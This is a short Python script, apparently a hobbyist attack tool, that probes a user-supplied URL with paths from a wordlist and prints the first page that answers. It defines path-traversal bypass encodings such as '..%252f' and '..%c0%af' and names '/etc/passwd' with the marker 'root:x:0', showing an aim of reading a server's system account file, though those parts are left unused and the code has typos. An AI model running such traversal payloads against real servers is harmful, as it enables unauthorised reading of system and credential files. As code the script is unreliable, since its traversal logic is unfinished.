import requests

path = input("Enter wordlist (/usr/share/rockyout.txt): ")

sub_list = open(path).read()
directories = sub_list.splitlines()
bypass = [
    "/",
    "../",
    r"..%252f",
    r"..%c0%af"
]
a = input("Enter URL (http://google.com/):")
filenmae = "/etc/passwd"
print("\n")
content = "root:x:0"
for dir in directories:
    dir_enum = a + dir
    r = requests.get(dir_enum)
    if r.status_code == 200:
        print("Directory:", dir_enum)
        print(r.text)
        break
    else:
        pass
